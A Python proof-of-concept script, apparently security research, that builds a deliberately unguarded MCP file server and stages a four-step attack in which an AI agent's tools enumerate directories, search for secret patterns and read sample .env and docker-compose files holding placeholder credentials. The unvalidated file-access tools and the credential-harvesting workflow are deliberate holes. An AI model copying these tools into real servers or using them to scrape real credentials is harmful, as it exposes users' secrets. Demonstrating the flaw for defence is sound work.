#!/usr/bin/env python3
"""
Proof of Concept: Vulnerable MCP Server for Environment Variable Scraping

This demonstrates how a seemingly legitimate MCP file server can be exploited
to perform environment variable scraping attacks.

Author: Raju Kumar Yadav
Date: 2025-08-10
WARNING: This is for educational/research purposes only.
"""

import asyncio
import json
import os
import sys
from pathlib import Path
from typing import Any, Dict, List

class VulnerableMCPServer:
    """
    A vulnerable MCP server that provides file reading capabilities
    without proper security controls, enabling environment variable scraping.
    """
    
    def __init__(self):
        self.tools = [
            {
                "name": "read_file",
                "description": "Read files from the filesystem for debugging and analysis",
                "inputSchema": {
                    "type": "object",
                    "properties": {
                        "file_path": {
                            "type": "string", 
                            "description": "Path to the file to read"
                        }
                    },
                    "required": ["file_path"]
                }
            },
            {
                "name": "list_directory",
                "description": "List directory contents to find configuration files",
                "inputSchema": {
                    "type": "object",
                    "properties": {
                        "directory_path": {
                            "type": "string",
                            "description": "Path to directory to list"
                        }
                    },
                    "required": ["directory_path"]
                }
            },
            {
                "name": "search_files",
                "description": "Search for files containing specific patterns",
                "inputSchema": {
                    "type": "object", 
                    "properties": {
                        "pattern": {
                            "type": "string",
                            "description": "Pattern to search for in files"
                        },
                        "directory": {
                            "type": "string", 
                            "description": "Directory to search in"
                        }
                    },
                    "required": ["pattern"]
                }
            }
        ]

    def get_tools(self) -> List[Dict[str, Any]]:
        """Return available tools"""
        return self.tools

    def read_file(self, file_path: str) -> Dict[str, Any]:
        """
        Read file contents - VULNERABLE: No path validation or access controls
        """
        try:
            # SECURITY FLAW: No path traversal protection
            # SECURITY FLAW: No access control checks  
            # SECURITY FLAW: Can read any file the server has access to
            
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                
            return {
                "success": True,
                "content": content,
                "file_path": file_path,
                "size": len(content)
            }
            
        except FileNotFoundError:
            return {"success": False, "error": f"File not found: {file_path}"}
        except PermissionError:
            return {"success": False, "error": f"Permission denied: {file_path}"}
        except Exception as e:
            return {"success": False, "error": f"Error reading file: {str(e)}"}

    def list_directory(self, directory_path: str) -> Dict[str, Any]:
        """
        List directory contents - VULNERABLE: No access controls
        """
        try:
            # SECURITY FLAW: No directory traversal protection
            # SECURITY FLAW: Can list any directory
            
            path = Path(directory_path)
            if not path.exists():
                return {"success": False, "error": f"Directory not found: {directory_path}"}
                
            if not path.is_dir():
                return {"success": False, "error": f"Not a directory: {directory_path}"}
                
            files = []
            for item in path.iterdir():
                files.append({
                    "name": item.name,
                    "type": "directory" if item.is_dir() else "file",
                    "path": str(item)
                })
                
            return {
                "success": True,
                "files": files,
                "directory": directory_path
            }
            
        except Exception as e:
            return {"success": False, "error": f"Error listing directory: {str(e)}"}

    def search_files(self, pattern: str, directory: str = ".") -> Dict[str, Any]:
        """
        Search for files containing patterns - VULNERABLE: Can search anywhere
        """
        try:
            import re
            import glob
            
            # SECURITY FLAW: Can search entire filesystem
            # SECURITY FLAW: No pattern restrictions
            
            matches = []
            search_path = Path(directory)
            
            # Search for files matching common env patterns
            env_patterns = ["*.env*", ".env*", "*config*", "*secret*", "*credential*"]
            
            for env_pattern in env_patterns:
                for file_path in search_path.rglob(env_pattern):
                    if file_path.is_file():
                        try:
                            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                                if re.search(pattern, content, re.IGNORECASE):
                                    matches.append({
                                        "file": str(file_path),
                                        "pattern_found": pattern,
                                        "preview": content[:200] + "..." if len(content) > 200 else content
                                    })
                        except:
                            continue
                            
            return {
                "success": True,
                "matches": matches,
                "pattern": pattern,
                "directory_searched": directory
            }
            
        except Exception as e:
            return {"success": False, "error": f"Error searching files: {str(e)}"}

    def handle_tool_call(self, tool_name: str, arguments: Dict[str, Any]) -> Dict[str, Any]:
        """Handle tool calls from MCP client"""
        
        if tool_name == "read_file":
            file_path = arguments.get("file_path")
            if not file_path:
                return {"success": False, "error": "file_path parameter required"}
            return self.read_file(file_path)
            
        elif tool_name == "list_directory":
            directory_path = arguments.get("directory_path", ".")
            return self.list_directory(directory_path)
            
        elif tool_name == "search_files":
            pattern = arguments.get("pattern")
            directory = arguments.get("directory", ".")
            if not pattern:
                return {"success": False, "error": "pattern parameter required"}
            return self.search_files(pattern, directory)
            
        else:
            return {"success": False, "error": f"Unknown tool: {tool_name}"}

def create_sample_env_files():
    """Create sample environment files for the demonstration"""
    
    # Create sample .env file
    env_content = """# Application Configuration
DATABASE_URL=postgresql://admin:password123@db.example.com:5432/production
AWS_ACCESS_KEY_ID=AKIA_EXAMPLE_KEY_ID_123456
AWS_SECRET_ACCESS_KEY=EXAMPLE_SECRET_ACCESS_KEY_FOR_RESEARCH_ONLY
STRIPE_SECRET_KEY=sk_test_example_key_for_research_purposes_123
JWT_SECRET=example_jwt_secret_token_for_research
SENDGRID_API_KEY=SG.example_sendgrid_key_for_research_demo
REDIS_PASSWORD=example_redis_password_123

# Third-party integrations
SLACK_BOT_TOKEN=xoxb-example-slack-token-for-research-demo
GITHUB_TOKEN=ghp_example_github_token_for_research_demo_123
"""

    # Create sample docker-compose file
    docker_compose_content = """version: '3.8'
services:
  web:
    image: myapp:latest
    environment:
      - DATABASE_URL=postgresql://user:password@db:5432/myapp
      - SECRET_KEY=production_secret_key_2024
      - API_TOKEN=api_token_for_external_service
  
  db:
    image: postgres:13
    environment:
      POSTGRES_DB: myapp
      POSTGRES_USER: user
      POSTGRES_PASSWORD: database_admin_password_123
      
  redis:
    image: redis:6
    command: redis-server --requirepass redis_cluster_password
"""

    # Create the files in poc directory
    poc_dir = Path("poc")
    poc_dir.mkdir(exist_ok=True)
    
    with open(poc_dir / ".env", "w") as f:
        f.write(env_content)
        
    with open(poc_dir / "docker-compose.yml", "w") as f:
        f.write(docker_compose_content)
        
    print("✅ Created sample environment files for demonstration")

def demonstrate_attack():
    """Demonstrate environment variable scraping attack using MCP"""
    
    print("🎯 SAFE-T1503 Environment Variable Scraping - Proof of Concept")
    print("=" * 65)
    print()
    
    # Create sample files
    create_sample_env_files()
    
    # Initialize vulnerable MCP server
    server = VulnerableMCPServer()
    
    print("📋 Available MCP Tools:")
    for i, tool in enumerate(server.get_tools(), 1):
        print(f"  {i}. {tool['name']}: {tool['description']}")
    print()
    
    # Simulate attack scenario
    print("🚨 ATTACK SIMULATION: AI Agent exploited to scrape environment variables")
    print("-" * 65)
    print()
    
    # Attack Step 1: Directory enumeration
    print("🔍 Step 1: Enumerate directories for configuration files")
    result = server.handle_tool_call("list_directory", {"directory_path": "poc"})
    if result["success"]:
        print("   Found files:")
        for file in result["files"]:
            print(f"     - {file['name']} ({file['type']})")
    print()
    
    # Attack Step 2: Search for credential patterns
    print("🔍 Step 2: Search for credential patterns in files")
    result = server.handle_tool_call("search_files", {
        "pattern": "API_KEY|SECRET|PASSWORD|TOKEN",
        "directory": "poc"
    })
    if result["success"]:
        print(f"   Found {len(result['matches'])} files with credentials:")
        for match in result["matches"]:
            print(f"     - {match['file']}")
    print()
    
    # Attack Step 3: Extract .env file contents
    print("🎯 Step 3: Extract .env file contents")
    result = server.handle_tool_call("read_file", {"file_path": "poc/.env"})
    if result["success"]:
        print("   🚨 CREDENTIALS EXPOSED:")
        content = result["content"]
        lines = content.split('\n')
        for line in lines:
            if '=' in line and not line.strip().startswith('#') and line.strip():
                key, value = line.split('=', 1)
                if any(sensitive in key.upper() for sensitive in ['KEY', 'SECRET', 'PASSWORD', 'TOKEN']):
                    # Mask the value for display
                    masked_value = value[:8] + "***REDACTED***"
                    print(f"     🔓 {key}={masked_value}")
    print()
    
    # Attack Step 4: Extract docker-compose secrets
    print("🎯 Step 4: Extract Docker Compose environment variables")
    result = server.handle_tool_call("read_file", {"file_path": "poc/docker-compose.yml"})
    if result["success"]:
        print("   🚨 CONTAINER SECRETS EXPOSED:")
        content = result["content"]
        lines = content.split('\n')
        for line in lines:
            if 'PASSWORD' in line.upper() or 'SECRET' in line.upper() or 'TOKEN' in line.upper():
                if ':' in line:
                    parts = line.split(':', 1)
                    if len(parts) == 2:
                        key = parts[0].strip()
                        value = parts[1].strip()
                        masked_value = value[:8] + "***REDACTED***" if len(value) > 8 else "***REDACTED***"
                        print(f"     🔓 {key}: {masked_value}")
    print()
    
    print("💀 ATTACK SUCCESSFUL!")
    print("   ✅ Extracted database credentials")
    print("   ✅ Extracted AWS access keys") 
    print("   ✅ Extracted API tokens")
    print("   ✅ Extracted service passwords")
    print()
    print("🛡️  This demonstrates how MCP tools can be exploited for credential harvesting")
    print("   when proper security controls are not implemented.")

if __name__ == "__main__":
    demonstrate_attack()
